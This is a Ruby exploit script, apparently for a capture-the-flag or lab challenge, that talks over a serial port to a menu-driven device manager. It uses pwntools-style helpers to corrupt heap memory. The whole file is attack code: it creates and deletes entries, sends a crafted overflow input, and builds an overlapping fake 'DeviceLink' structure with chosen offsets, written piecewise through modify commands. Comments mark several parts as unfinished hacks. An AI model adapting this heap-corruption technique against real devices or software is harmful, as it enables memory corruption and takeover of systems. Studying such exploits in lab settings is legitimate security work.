#!/usr/local/bin/rescue
# encoding: ASCII-8BIT

require 'pwn'

def wswap(number)
	number += 256 if number < 256 # XXX HACK!
	return (number%256).chr + (number/256).chr
end

if not defined? Payload then

	HAX = (32 + 2 + 11 + 2 + 11).chr # device 1 + Link 2 + Link 3

	Stripes = ('a'..'z').map{|x| ('0'..'9').map{|y| [x,y] } }.join[0,199]

	Overlay = [
		wswap(11),                   # sizeof(DeviceLink), malloc entry
		2.chr,                       # id
		wswap(12),                   # nameLen: sizeof(DeviceLink) + "\0"
		wswap(200),                  # keyLen
		wswap(0x22a0 + 2+11+2),      # offset to name
		wswap(0x22a0 + 2+11+2+12+2), # offset to key
		'x'                          # next DeviceLink, will be overwritten, along with terminal null
	].join

	Payload = [
		[2, 'ab', '12'],               # create device 0
		[2, 'cdefg', '34567890'],      # create device 1
		[2, 'ijklmnopqrst', Stripes],  # create device 2
		[3, 1],                        # delete device 1
		[4, 0, 'uv', 'wxy'+HAX],       # haxs
		[2, Overlay.gsub(/\0/,'_'), 'z'*27], # create device 3, overlap with 2
	]

	# In order to send overlay, we need to multi-write it using modifies
	# This works because, modify only looks at next, which is set after we overlay
	# XXX might be overkill, none of the lengths are written right now..
	# I've put a hack in that stops it from operating. We'll see if it matters
	oswp = ''
	Overlay.split("\0").map { |oo|
		oswp += '_' unless oswp.empty?
		oswp += oo
	}.reverse[1..-1].each { |partial|
		Payload << [4, 3, partial, 'derp']
	}

end

def flush()
	loop do
		buf = $serial.recvn 100, timeout:1
		if buf =~ /Choose one/ then
			parts = buf.split 'Choose one'
			raise if parts.length != 2
			print parts.first
			$serial.unrecv 'Choose one' + parts.last
			break
		elsif buf.empty?
			break
		else
			print buf
		end
	end
end

def waitForPrompt(prompt)
	buffer = ''
	loop do
		char = $serial.recvn 1, timeout:1
		buffer += char
		print char
		sleep 0.5 if char.empty?
		break if buffer =~ prompt
	end
end

def serialSend(output)
	line = output.to_s + "\n"
	line = output if output == 'wxy'+HAX # hack
	raise if line.include? "\0"
	$serial.send line
	flush()
end

def sendCommand(command)
	puts "Sending #{command.join('-')}"
	serialSend command.first
	command[1..-1].each do |item|
		waitForPrompt /: /
		serialSend item
	end
end

begin
	if ARGV.length < 1 then
		puts "Usage: #{$0} <port>"
		exit(1)
	end

	$serial = Pwnlib::Tubes::SerialTube.new ARGV[0], 115_200, false
	puts "ready and waiting..."
	Payload.each do |cmd|
		waitForPrompt /5. Exit\n/
		sendCommand cmd

		# debugging
		waitForPrompt /5. Exit\n/
		puts
		sendCommand [1] # XXX Warning: this might break when we get to the overlay...
		puts "continue? "
		#raise if STDIN::gets.chomp == "no"
		puts
	end

	raise
end

